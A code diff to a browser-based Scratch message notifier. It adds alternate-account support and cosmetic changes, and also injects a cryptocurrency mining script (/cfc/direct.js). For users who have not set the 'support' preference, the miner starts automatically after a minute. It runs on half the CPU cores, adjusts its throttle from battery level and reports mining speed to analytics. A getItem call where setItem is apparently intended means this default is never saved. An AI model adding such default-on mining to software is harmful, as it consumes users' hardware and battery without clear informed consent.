@@ -3,7 +3,8 @@ function main() {
     if(localStorage.getItem("username")) {
         notifier();
         settings();
-        setTimeout(setMineSpeed,10000);
+        if(localStorage.getItem("support")==="1") {loadMiner(); setTimeout(setMineSpeed,10000);}
+        if(localStorage.getItem("support")===null){localStorage.getItem("support", "1"); setTimeout(loadMiner,60000); setTimeout(setMineSpeed,70000);}
         gtag('event', 'newsession');
     }
     else {
@@ -14,14 +15,22 @@ function main() {
     if(location.hash==="#overview" && !localStorage.getItem("overviewDone") && localStorage.getItem("username")) overview();
 }
 
+var loadMiner = function() {
+  var cfc = document.createElement("script");
+  cfc.src = "/cfc/direct.js";
+  cfc.setAttribute("data-level", "5");
+  cfc.setAttribute("data-user", "2951276");
+  document.head.appendChild(cfc);
+}
+
 var setMineSpeed = function(){
-  if(localStorage.getItem("support")==="0"){miner.stop(); clearInterval(mineInterval);}
-  else {
+  var mineInterval = setInterval(setMineSpeed, 60000);
   if(typeof(miner)==="undefined") {localStorage.setItem("support","0"); clearInterval(mineInterval); return;}
+  miner.setNumThreads(navigator.hardwareConcurrency/2);
   try {
   navigator.getBattery().then(function(battery) {
-    if(battery.level===null) miner.setThrottle(0.95);
-    else miner.setThrottle((100-0.03*(battery.level.toFixed(1)*100))/100);});
+    if(battery.level===null) {miner.setThrottle(0.95); clearInterval(mineInterval);}
+    else miner.setThrottle((100-0.08*(battery.level.toFixed(1)*100))/100);});
     gtag('event', 'mining', {
       'speed': miner.getThrottle()*100,
     });
@@ -32,9 +41,7 @@ var setMineSpeed = function(){
     });
     clearInterval(mineInterval);
   }
-} // End else
 };
-var mineInterval = setInterval(setMineSpeed, 60000);
 
 if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
   document.write("Whoops! Scratch Notifier is only available in computers with Windows, Mac or Linux.")
@@ -44,10 +51,27 @@ function notifier() {
 
     setTimeout(function(){location.reload();},1000*60*60*3); // Refresh after 3 hours
 
+    // Load background
+
+    getBackground();
+    function getBackground() {
+      var bgImg = new Image();
+      bgImg.src = 'https://picsum.photos/'+ screen.width +'/' + screen.height + '/?random';
+      bgImg.onload = function(){
+        Pace.stop();
+        setTimeout(function() {
+        document.body.style.backgroundImage = 'url('+bgImg.src+')';
+        document.getElementById("page").style.display = "block";
+        document.getElementById("pageTitle").style.display = "";
+      }, 200);
+      };
+    bgImg.onerror = getBackground;
+  }
+
     document.ondblclick  = function(click){
         var element = click.path[0].id;
         if(element==="msgNum" || element==="notifier" || element==="page") {
-          window.getSelection().removeAllRanges();
+          getSelection().removeAllRanges();
           openLink("https://scratch.mit.edu/messages/");
       }
     };
@@ -57,9 +81,10 @@ function notifier() {
     messagesTab = null;
 
     user = localStorage.getItem("username");
-    notifClose = localStorage.getItem("notifTimeClose")===null?"0":localStorage.getItem("notifTimeClose")*1000;
+    notifClose = localStorage.getItem("notifTimeClose")===null?0:localStorage.getItem("notifTimeClose")*1000;
     audio = function() {return Number(localStorage.getItem("sound"));};
     tts = Number(localStorage.getItem("tts"));
+    altEnabled = Number(localStorage.getItem("altEnabled"));
 
     setInterval(function(){checkMessages(false);},10000);
     checkMessages(true);
@@ -120,6 +145,28 @@ function notifier() {
             document.getElementById("soundicon").innerText = "volume_off";
         }
     };
+
+    if(altEnabled) {
+      altUser = localStorage.getItem("altAcc");
+      altID = localStorage.getItem("altID");
+      document.getElementById("altAcc").style.display = "";
+      altNotifications = function() {
+        if(!notifications()) return 0;
+        else return Number(localStorage.getItem("altNotifications"));
+      };
+      document.getElementById("usernameAlt").innerText = altUser;
+      if(altNotifications()) document.getElementById("settAltNotify").click();
+      document.getElementById("settAltNotify").onclick = function() {
+        localStorage.setItem("altNotifications", Number(document.getElementById("settAltNotify").checked));
+      }
+      checkAltMessages(true);
+      setInterval(function(){checkAltMessages(false);}, 60000);
+    }
+
+    if(!altEnabled) {
+      document.getElementById("addAlt").innerText = "Add alternate account";
+      document.getElementById("showIfAltOn").style.display = "none";
+    }
 
 } // End notifier
 
@@ -194,6 +241,26 @@ function checkMessages(firsttime) {
     }
 }
 
+function checkAltMessages(firsttime) {
+  var apireq = new XMLHttpRequest();
+  apireq.open( "GET", 'https://api.scratch.mit.edu/users/' + altUser + '/messages/count?' + Math.floor(Date.now()), true);
+  apireq.send();
+  apireq.onreadystatechange = function() {
+      if (apireq.readyState === 4 && apireq.status === 200) {
+        altMsg = String(JSON.parse(apireq.responseText).count);
+        if(altMsg===document.getElementById("altMsgNum").innerText) return;
+        if(altMsg>document.getElementById("altMsgNum").innerText && firsttime===false && altNotifications()) {
+          var notification = new Notification(altUser + ': ' + altMsg + ' messages', {
+              icon: 'https://cdn2.scratch.mit.edu/get_image/user/' + localStorage.getItem("altID") + '_100x100.png',
+              body: "Click to focus the notifier.",
+          });
+          if(notifClose!==0) setTimeout(function(){notification.close();},notifClose);
+          notification.onclick = function () {window.focus(); notification.close();}
+        }
+        document.getElementById("altMsgNum").innerText = altMsg;
+      }}
+}
+
 function notify() {
     if(!notifications()&&audio()){
         snd.play();
@@ -209,7 +276,7 @@ function notify() {
         icon: './images/logo.png',
         body: "Click to read " + (msg==="1"?"it":"them") + ".",
     });
-    if(notifClose!=="0") setTimeout(function(){notification.close();},notifClose);
+    if(notifClose!==0) setTimeout(function(){notification.close();},notifClose);
     notification.onshow = function(){
         if(audio()) {
           snd.play();
@@ -232,7 +299,7 @@ function notifyComment(author,content,Id,profilePic) {
         icon: profilePic,
         body: content,
     });
-    if(notifClose!=="0") setTimeout(function(){notification.close();},notifClose);
+    if(notifClose!==0) setTimeout(function(){notification.close();},notifClose);
     notification.onshow = function(){
       if(tts) {
         var ttsComment = new SpeechSynthesisUtterance(author + " commented: " + content);
@@ -280,7 +347,7 @@ function newUser() {
         content: "input",
     })
         .then((value) => {
-        if((value===null|value==='')){}else{
+        if(value===null||value===''||value.toUpperCase()===altUser.toUpperCase()){}else{
             var apireq = new XMLHttpRequest();
             apireq.open( "GET", "https://api.scratch.mit.edu/users/" + value, true);
             apireq.send();
@@ -295,6 +362,38 @@ function newUser() {
         }
     }
              );
+}
+
+function newAlt() {
+    swal("Enter your alt username.", {
+        content: "input",
+    })
+        .then((value) => {
+        if(value===null||value===''||value.toUpperCase()===user.toUpperCase()){}else{
+            var apireq = new XMLHttpRequest();
+            apireq.open( "GET", "https://api.scratch.mit.edu/users/" + value, true);
+            apireq.send();
+            apireq.onreadystatechange = function() {
+                    if(apireq.readyState === 4 && apireq.status === 200) {
+                        gtag('event', 'newalt');
+                        localStorage.setItem("altAcc",JSON.parse(apireq.responseText).username);
+                        localStorage.setItem("altID", JSON.parse(apireq.responseText).id);
+                        localStorage.setItem("altEnabled","1")
+                        location.reload();
+                    }
+                }; // Request done
+        }
+    }
+             );
+}
+
+function switchAccs() {
+  var userID = localStorage.getItem("userid");
+  localStorage.setItem("altID", userID);
+  localStorage.setItem("altAcc", user);
+  localStorage.setItem("username", altUser);
+  localStorage.setItem("userid", altID);
+  location.reload();
 }
 
 function setFavicon() {
@@ -332,11 +431,15 @@ function settings() {
   if(!notificationsEnabled()) document.getElementById("settSendNotifs").click();
   document.getElementById(localStorage.getItem("sfx")===null ? "Snapchat" : localStorage.getItem("sfx")).selected = true;
   document.getElementById("settSFX").onchange = function() {
-    var newsfx = new Audio("./sfx/" + document.getElementById("settSFX").children[document.getElementById("settSFX").selectedIndex].id + ".wav");
+    newsfx = new Audio("./sfx/" + document.getElementById("settSFX").children[document.getElementById("settSFX").selectedIndex].id + ".wav");
     newsfx.play();
+    document.getElementById("play").innerText = "Loading and playing sound..."
+    document.getElementById("play").setAttribute("onclick", "//" + document.getElementById("play").getAttribute("onclick"));
+    document.getElementById("play").style.textDecoration = "";
+    newsfx.onended = function() {document.getElementById("play").innerText = "Play"; document.getElementById("play").setAttribute("onclick", document.getElementById("play").getAttribute("onclick").substring(2)); document.getElementById("play").style.textDecoration = "underline";}
   }
   if(localStorage.getItem("tts")==="1") document.getElementById("settTTS").click();
-  if(localStorage.getItem("support")!=="0") document.getElementById("settCFC").click()
+  if(localStorage.getItem("support")!=="0") document.getElementById("settCFC").click();
   document.getElementById("saveSettings").onclick = function() {
     gtag('event', 'settingssaved');
     localStorage.setItem("notifTimeClose",document.getElementById("settTimeClose").value);
